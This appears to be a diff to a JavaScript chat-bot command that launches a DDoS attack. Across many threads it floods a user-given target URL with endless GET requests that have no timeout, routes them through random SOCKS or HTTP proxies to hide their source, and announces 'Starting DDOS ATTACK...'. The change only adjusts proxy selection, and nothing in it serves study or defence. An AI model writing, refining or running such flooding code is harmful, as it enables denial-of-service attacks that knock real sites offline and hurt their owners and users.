@@ -82,7 +82,7 @@ const loadProxies = () => {
 const performAttack = (url, agent, headers, onComplete) => {
     axios
     .get(url, {
-        httpAgent: agent, headers, timeout: 0
+        httpAgent: agent || null, headers, timeout: 0
     })
     .then(() => setTimeout(() => performAttack(url, agent, headers, onComplete), 0))
     .catch((err) => {
@@ -128,19 +128,18 @@ module.exports["run"] = async ({
     await chat.reply(font.thin("Starting DDOS ATTACK..."));
 
     for (let i = 0; i < numThreads; i++) {
-        for (const proxy of proxies) {
-            const [host, port] = proxy.split(":");
-            let agent;
+        const randomProxy = getRandomElement(proxies);
+        const [host, port] = randomProxy.split(":");
+        let agent;
 
-            const proxyProtocol = host.startsWith("socks") ? "socks5" : "http";
-            const proxyUrl = `${proxyProtocol}://${host}:${port}`;
+        const proxyProtocol = host.startsWith("socks") ? "socks5" : "http";
+        const proxyUrl = `${proxyProtocol}://${host}:${port}`;
 
-            agent = proxyProtocol === "socks5"
-                ? new SocksProxyAgent(proxyUrl)
-                : new HttpsProxyAgent(proxyUrl);
+        agent = proxyProtocol === "socks5"
+            ? new SocksProxyAgent(proxyUrl)
+            : new HttpsProxyAgent(proxyUrl);
 
-            performAttack(targetUrl, agent, headers, () => (continueAttack = false));
-        }
+        performAttack(targetUrl, agent, headers, () => (continueAttack = false));
     }
 
     setTimeout(() => {
